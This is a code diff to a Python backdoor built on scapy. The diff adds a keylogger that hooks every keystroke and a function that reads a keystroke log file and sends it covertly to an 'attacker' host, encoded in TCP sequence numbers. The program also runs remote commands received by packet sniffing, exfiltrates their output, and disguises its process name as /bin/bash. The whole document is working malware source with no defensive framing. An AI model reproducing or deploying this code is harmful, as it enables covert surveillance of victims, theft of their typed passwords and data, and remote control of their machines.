@@ -37,11 +37,11 @@ setFlag = "E"
 myip = ("192.168.0.3", 66)
 
 
-def secret_send(msg: str, type: str = 'command'):
+def secret_send(msg: str, type: str):
     """
     Keyword arguments:
     msg      - payload being sent
-    type     - file or command (default:command)
+    type     - file or command
     """
     if(type == "command"):
         # Convert message to ASCII to bits
@@ -49,23 +49,23 @@ def secret_send(msg: str, type: str = 'command'):
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
         send(packets, verbose=True)
-        send(IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1], flags="U"))
-    if(type == "file"):
-        #raed the file
-        #store it
+        send(IP(dst=attacker[0], ttl=TTL) /
+                       TCP(sport=myip[1], dport=attacker[1], flags="U"))
+    elif(type == "file"):
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
         send(packets, verbose=True)
-        send(IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1], flags="P"))
+        send(IP(dst=attacker[0], ttl=TTL) /
+                       TCP(sport=myip[1], dport=attacker[1], flags="P"))
 
 
 def packatizer(msg):
     """[summary]
-    
+
     Arguments:
         msg {[type]} -- [description]
-    
+
     Returns:
         [type] -- [description]
     """
@@ -91,10 +91,10 @@ def packatizer(msg):
 
 def craft(data: str) -> IP:
     """[summary]
-    
+
     Arguments:
         data {str} -- [description]
-    
+
     Returns:
         IP -- [description]
     """
@@ -102,14 +102,13 @@ def craft(data: str) -> IP:
     global TTL
     global setFlag
     # The payload contains the unique password, UID, position number and total.
-    packet = IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1],
-                                            seq=int(str(data), 2), flags=setFlag)
+    packet = IP(dst=attacker[0], ttl=TTL)/TCP(sport=myip[1], dport=attacker[1],seq=int(str(data), 2), flags=setFlag)
     return packet
 
 
 def execPayload(command):
     """[summary]
-    
+
     Arguments:
         command {str} -- [description]
     """
@@ -120,12 +119,19 @@ def execPayload(command):
     result = proc.stdout.read() + proc.stderr.read()
     payload = str(result)
     print(payload)
-    secret_send(payload)
+    secret_send(payload,"command")
 
+def getLogFile():
+    file = open('/root/Documents/file.log','r')
+    f = file.read()
+    #print(f)
+    secret_send(f,"file")
+    file.close()
+    return
 
 def commandResult(packet):
     """[summary]
-    
+
     Arguments:
         packet {scapy.packet} -- [description]
     """
@@ -148,6 +154,8 @@ def commandResult(packet):
             execPayload(payload)
             messages = []
         elif flag == 0x08:
+            getLogFile()
+            #print("Server wants key log file!")
 
 
 
@@ -160,11 +168,20 @@ setproctitle.setproctitle("/bin/bash")  # set fake process name
 sniffThread = threading.Thread(target=commandSniffer)
 fileMonitor = Monitor()
 
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+
 fileMonitor.daemon = True
 sniffThread.daemon = True
+new_hook.daemon = True
 
 sniffThread.start()
-# fileMonitor.start()
+fileMonitor.start()
+new_hook.start()
 
 while True:
     try:
